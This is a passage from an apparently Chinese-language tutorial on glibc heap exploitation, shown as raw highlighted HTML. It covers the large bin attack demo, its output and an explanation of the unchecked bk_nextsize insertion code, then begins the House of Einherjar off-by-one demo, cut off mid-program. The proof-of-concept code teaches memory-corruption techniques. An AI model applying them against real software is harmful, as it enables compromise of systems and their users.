</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>stack_var1</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>stack_var2</span> <span class=o>-</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//------------------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mh>0x90</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&#34;</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;During this time, targets should have already been rewritten:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_var1 (%p): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var1</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>stack_var1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;stack_var2 (%p): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var2</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>stack_var2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file demonstrates large bin attack by writing a large unsigned long value into stack
</span></span><span class=line><span class=cl>In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s first look at the targets we want to rewrite on stack:
</span></span><span class=line><span class=cl>stack_var1 (0x7fff33530b00): 0
</span></span><span class=line><span class=cl>stack_var2 (0x7fff33530b08): 0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now, we allocate the first large chunk on the heap at: 0xef3000
</span></span><span class=line><span class=cl>And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Then, we allocate the second large chunk on the heap at: 0xef3360
</span></span><span class=line><span class=cl>And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Finally, we allocate the third large chunk on the heap at: 0xef37a0
</span></span><span class=line><span class=cl>And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We free the first and second large chunks now and they will be inserted in the unsorted bin: [0xef3360 &lt;--&gt; 0xef3000 ]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [0xef30a0]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now, we free the third large chunk and it will be inserted in the unsorted bin: [0xef37a0 &lt;--&gt; 0xef30a0 ]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now emulating a vulnerability that can overwrite the freed second large chunk&#39;s&#34;size&#34;as well as its&#34;bk&#34;and&#34;bk_nextsize&#34; pointers
</span></span><span class=line><span class=cl>Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set &#34;bk&#34; to 16 bytes before stack_var1 and &#34;bk_nextsize&#34; to 32 bytes before stack_var2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
</span></span><span class=line><span class=cl>stack_var1 (0x7fff33530b00): 0xef37a0
</span></span><span class=line><span class=cl>stack_var2 (0x7fff33530b08): 0xef37a0
</span></span></code></pre></td></tr></table></div></div><p>这种攻击方法在 glibc 2.29 推出，unsorted bin attack 失效之后可能会有大的用武之地。</p><p>首先分配了一个 small chunk <code>p1</code>，然后分配了 2 个 large chunk <code>p2</code> 和 <code>p3</code>。在每个 chunk 后面都插一小段 fast chunk 防止合并。释放掉 <code>p1</code> 和 <code>p2</code>，两者都会进入 unsorted bin。</p><p>随后申请比 <code>p1</code> 小的 chunk，这一步比较复杂：</p><ol><li>从 unsorted bin 末尾拿出 <code>p1</code>，放入对应 small bin</li><li>从 unsorted bin 末尾拿出 <code>p2</code>，由于 large bin 为空，直接放入对应 large bin</li><li>unsorted bin 已经空了，于是从 small bin 中拿出 <code>p1</code>，切割 0x90 的 chunk 返回给程序</li><li><code>p1</code> 被切割剩下的部分 <code>_p1</code> 重新回到 unsorted bin</li></ol><p>再释放 <code>p3</code>，也进入 unsorted bin。这时，large bin 中有 <code>p2</code> 一个 chunk，大小为 0x410；unsorted bin 中有 <code>p3</code>，<code>_p1</code> 两个 chunk，大小分别为 0x410,0x290（0x330-0xa0）。</p><p>现在假设能控制整个 <code>p2</code> 的内容，让它的 <code>chunk_size=0x3f1</code>，<code>bk=addr1</code> 且 <code>bk_nextsize=addr2</code>。那么再次申请 small chunk 时：</p><ol><li>从 unsorted bin 末尾拿出 <code>_p1</code>，放入对应 small bin</li><li>从 unsorted bin 末尾拿出 <code>p3</code>，准备放入对应 large bin，但是对应 large bin 非空</li><li>从对应 large bin 第一个 chunk（<code>p2</code>）开始遍历，由于 <code>p2</code> 大小被修改，<code>0x3f0 &lt; 0x410</code>，所以 <code>p3</code> 插入到了链表头。</li></ol><p>插入的代码是这样的，注意这里没有检查 <code>bk_nextsize</code> 的合法性：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=n>size</span> <span class=o>==</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=cm>/* Always insert in the second position.  */</span>
</span></span><span class=line><span class=cl>  <span class=n>fwd</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>bck</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里的 <code>victim</code> 是 <code>p3</code>，<code>fwd</code> 是 <code>p2</code>，注意两者大小不能相等，因为漏洞在 <code>else</code> 里。由于 <code>fwd->bk_nextsize</code> 是 <code>addr2</code>，于是第二行把这个值给了 <code>victim->bk_nextsize</code>，第四行就等价于 <code>*(addr2+4) = victim</code>。</p><p>同时，这里令 <code>bck = fwd->bk</code> 即 <code>addr1</code>，而接着还会执行一段代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>mark_bin</span> <span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>victim_index</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>fwd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里 <code>bck->fd = victim</code> 就等价于 <code>*(addr1+2) = victim</code>。于是我们成功修改了 <code>addr1+2</code> 和 <code>addr2+4</code> 的值。</p><h2 id=house_of_einherjar>house_of_einherjar</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   Credit to st4g3r for publishing this technique
</span></span></span><span class=line><span class=cl><span class=cm>   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
</span></span></span><span class=line><span class=cl><span class=cm>   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak.
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Welcome to House of Einherjar!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Tested in Ubuntu 16.04 64bit.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>uint8_t</span><span class=o>*</span> <span class=n>d</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>We allocate 0x38 bytes for &#39;a&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x38</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;a: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>real_a_size</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Since we want to overflow &#39;a&#39;, we need the &#39;real&#39; size of &#39;a&#39; after rounding: %#x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>real_a_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// create a fake chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>We create a fake chunk wherever we want, in this case we&#39;ll create the chunk on the stack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;However, you can also create the chunk in the heap or the bss, as long as you know its address</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;(although we could do the unsafe unlink technique here in some scenarios)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>6</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span> <span class=c1>// prev_size is now used and must equal fake_chunk&#39;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span> <span class=c1>// size of the chunk just needs to be small enough to stay in the small bin
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>size_t</span><span class=p>)</span> <span class=n>fake_chunk</span><span class=p>;</span> <span class=c1>// fwd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>size_t</span><span class=p>)</span> <span class=n>fake_chunk</span><span class=p>;</span> <span class=c1>// bck
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>size_t</span><span class=p>)</span> <span class=n>fake_chunk</span><span class=p>;</span> <span class=c1>//fwd_nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>size_t</span><span class=p>)</span> <span class=n>fake_chunk</span><span class=p>;</span> <span class=c1>//bck_nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Our fake chunk at %p looks like:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;prev_size (not used): %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;fwd: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;bck: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;fwd_nextsize: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>4</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;bck_nextsize: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>5</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/* In this case it is easier if the chunk size attribute has a least significant byte with
</span></span></span><span class=line><span class=cl><span class=cm>	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of
</span></span></span><span class=line><span class=cl><span class=cm>	 * the chunk includes the amount requested plus some amount required for the metadata. */</span>
</span></span><span class=line><span class=cl>	<span class=n>b</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>real_b_size</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>We allocate 0xf8 bytes for &#39;b&#39;.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>uint64_t</span><span class=o>*</span> <span class=n>b_size_ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)(</span><span class=n>b</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>b.size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>b_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size is: (0x100) | prev_inuse = 0x101</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>a</span><span class=p>[</span><span class=n>real_a_size</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;b.size: %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>b_size_ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This is easiest if b.size is a multiple of 0x100 so you &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;don&#39;t change the size of b, only its prev_inuse bit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If it had been modified, we would need a fake chunk inside &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;b where it will try to consolidate the next chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Write a fake prev_size to the end of a
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>We write a fake prev_size to the last %lu bytes of a so that &#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;it will consolidate with our fake chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>size_t</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>fake_size</span> <span class=o>=</span> <span class=p>(</span><span class=n>size_t</span><span class=p>)((</span><span class=n>b</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=n>size_t</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)</span><span class=n>fake_chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Our fake prev_size will be %p - %p = %#lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=n>size_t</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>,</span> <span class=n>fake_size</span><span class=p>);</span>
